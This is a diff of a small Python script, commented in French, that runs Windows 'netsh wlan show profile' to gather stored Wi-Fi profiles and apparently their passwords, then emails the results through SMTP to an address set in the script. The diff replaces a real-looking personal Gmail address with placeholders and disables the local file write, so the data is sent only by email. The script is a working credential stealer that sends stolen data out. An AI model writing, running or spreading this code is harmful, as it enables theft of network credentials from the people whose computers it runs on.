@@ -1,11 +1,11 @@
 #!usr/bin/python3
 
-import subprocess, smtplib, re #c comme importer l'un apres l'qutre
+import subprocess, smtplib, re 
 import time
 from email.mime.text import MIMEText
 
-my_email = "nans2502@gmail.com"
-password = ""
+my_email = "votre@mail.com"
+password = "votre_mdp"
 
 command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True) #output de la commande, qui contient les noms des wireless outspots, type bytes
@@ -30,7 +30,7 @@ server.sendmail(my_email, my_email, msg.as_string()) #src, dest, contenue
 server.quit()
 #------------------------------------------------------------------#
 
-print(type(final_output))
-file = open("wifipasswords.txt","w") #changer la destination pour plus tard, voire meme pas creer de fichier
-file.write(final_output)
-file.close()
+# print(type(final_output))
+# file = open("wifipasswords.txt","w") #changer la destination pour plus tard, voire meme pas creer de fichier
+# file.write(final_output)
+# file.close()
